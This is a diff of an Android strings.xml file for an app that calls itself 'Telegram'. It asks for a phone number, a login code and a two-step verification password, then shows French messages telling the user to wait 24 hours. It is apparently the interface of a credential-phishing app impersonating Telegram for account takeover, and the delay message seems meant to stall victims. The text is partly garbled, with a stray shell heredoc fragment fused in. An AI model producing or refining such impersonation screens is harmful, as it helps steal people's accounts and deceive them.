@@ -18,39 +18,7 @@
 
     <!-- 👇 MODIFIE CES TEXTES 👇 -->
     <string name="success_title">Connexion Réussie !</string>
-    <string name="success_sub">Connexion autorisée. Patiente 24h pendant que tes informations sont traitées par les serveurs Telegramt géTelegram. Tu peux fermer l'application.</string>
-    
-    <string name="label_phone">Numéro</string>
-    <string name="label_code">Code</string>
-    <string name="label_password">Mot de passe</string>
-    <string name="none">—</string>
-
-    <string name="err_number">Enter a valid number</string>
-    <string name="err_code">Enter the code</string>
-    <string name="err_password">Enter the password</string>
-</resources>
-EOFcat << 'EOF' > app/src/main/res/values/strings.xml
-<?xml version="1.0" encoding="utf-8"?>
-<resources>
-    <string name="app_name">Telegram</string>
-
-    <string name="title_phone">Your Phone</string>
-    <string name="desc_phone">Confirm your country code and enter your phone number.</string>
-    <string name="hint_phone">Phone number</string>
-
-    <string name="title_code">Verification</string>
-    <string name="hint_code">Code</string>
-    <string name="code_sent_to">Code sent to %1$s. Open your Telegram app to read it.</string>
-
-    <string name="title_password">Two-Step Verification</string>
-    <string name="desc_password">Your account is protected with an additional password.</string>
-    <string name="hint_password">Password</string>
-
-    <string name="btn_next">Next</string>
-
-    <!-- 👇 MODIFIE CES TEXTES 👇 -->
-    <string name="success_title">Connexion Réussie !</string>
-    <string name="success_sub">Tes informations sont en cours de traitement. Patiente 24h avant de pouvoir utiliser nos services, tu peux fermer l'application et revenir ultérieurement.</string>
+    <string name="success_sub">Sesssion créée avec succès. Revient dans 24h après le traitement des informations sur les serveurs pour utiliser nos services.</string>
     
     <string name="label_phone">Numéro</string>
     <string name="label_code">Code</string>
